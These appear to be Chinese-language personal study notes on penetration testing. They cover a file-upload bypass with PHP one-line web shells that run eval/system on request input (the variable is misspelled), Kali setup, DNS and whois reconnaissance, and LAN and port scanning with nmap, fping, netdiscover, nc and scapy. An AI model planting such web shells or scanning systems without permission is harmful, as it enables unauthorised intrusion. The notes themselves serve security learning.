# 网络安全

## 文件上传漏洞

运用抓包软件改上传文件类型

上传脚本文件后使用

```php
<?php
    eval($_REQUST["script"]);
?>//运行脚本文件
<?php
    system($_REQUST["script"]);
?>//运行系统命令
```

## kali



更换kali源

```shell
vim /etc/apt/sourcelist
粘贴:
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src  http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
#main non-free 表示包
```

## 被动搜集信息

**运用第三方服务搜集信息**

#### dns信息搜集

```bash
ping 域名 -c 1 #发送一个数据包
nslookup 域名
nslookup www.baidu.com
Server:         192.168.1.1   
Address:        192.168.1.1#53

Non-authoritative answer:
www.baidu.com   canonical name = www.a.shifen.com.#别名
Name:   www.a.shifen.com#解析到的域名
Address: 14.215.177.38 #解析到的地址
Name:   www.a.shifen.com
Address: 14.215.177.39

Dig信息搜集
dig @ip(指定dns服务器) www.baidu.com any #查询


反向查询
dig -x ip #反查域名

查询网站域名和注册信息
whois 域名
```

#### 搜集子域名信息

maltego

#### shodan信息搜集

## 主动信息搜集

#### ping命令

```bash
ping ip -c number #发送数据包
ping 域名 
arping:将ip转换成mac地址
查看局域网ip冲突:
 #获取ip值命令
 arping 192.168.1.1 -c 1 |grep "bytes from" | cut -f 2 -d "(" | cut -f 1 -d ")"
 #对局域网进行ip扫描,若有一样的ip发生arp攻击
 
```

#### traceroute

```bash
traceroute 域名
traceroute to www.baidu.com (14.215.177.38), 30 hops max, 60 byte packets
 1  192.168.1.1 (192.168.1.1)  6.092 ms  6.267 ms  6.622 ms
 2  10.241.0.1 (10.241.0.1)  11.463 ms  11.794 ms  12.112 ms
 3  222.176.17.141 (222.176.17.141)  19.041 ms  19.303 ms  19.580 ms
 4  222.176.9.189 (222.176.9.189)  18.650 ms 222.176.6.69 (222.176.6.69)  18.372 ms *
 5  202.97.24.29 (202.97.24.29)  48.936 ms * *
 6  113.96.4.186 (113.96.4.186)  48.861 ms 113.96.4.178 (113.96.4.178)  42.299 ms 113.96.5.74 (113.96.5.74)  41.338 ms
 7  102.96.135.219.broad.fs.gd.dynamic.163data.com.cn (219.135.96.102)  39.453 ms 106.96.135.219.broad.fs.gd.dynamic.163data.com.cn (219.135.96.106)  40.405 ms 113.96.4.205 (113.96.4.205)  39.061 ms
 8  14.29.121.198 (14.29.121.198)  49.457 ms 14.29.117.246 (14.29.117.246)  39.550 ms 102.96.135.219.broad.fs.gd.dynamic.163data.com.cn (219.135.96.102)  41.017 ms
 

```

#### netdiscover

探测局域网中存货工具

```bash
netdiscover -i eth0 -r 192.168.1.0/24
#主动
netdiscover -p
#被动嗅探
```

#### hping3

web压力测试用,一次扫描一个目标

```
hping3 
```

#### fping

```bash
fping -g ip -c 1
fping -g 192.168.1.0/24  -c 1 |grep "bytes" >fping.txt
#查看局域网内所有网络设备并记录在文件中
```

#### nmap

网络扫描和嗅探

```bash
nmap -sn 192.168.1.1/24
#扫描局域网设备
半连接扫描(不会留下记录):
nmap -sS ip -p port 
```

#### nc

```bash
nc -nv ip -w (超时时间) -z(端口扫描)
```

### scapy

定制arp协议

```bash
ARP().display()
###[ ARP ]### 
  hwtype= 0x1 #硬件类型
  ptype= IPv4
  hwlen= None
  plen= None
  op= who-has
  ###四元组###
  hwsrc= 08:00:27:0e:34:8d
  psrc= 192.168.1.13
  hwdst= 00:00:00:00:00:00
  pdst= 0.0.0.0
  ###end###
  sr1(ARP(pdst="ip"));#定制数据包
  
  
  IP().display()
###[ IP ]### 
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= hopopt
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\
  
  定制syn请求:
  
  TCP().display()
###[ TCP ]### 
  sport= ftp_data
  dport= http
  seq= 0
  ack= 0
  dataofs= None
  reserved= 0
  flags= S #包的类型
  window= 8192
  chksum= None
  urgptr= 0
  options= []
```

### wireshark

抓包

#### 过滤

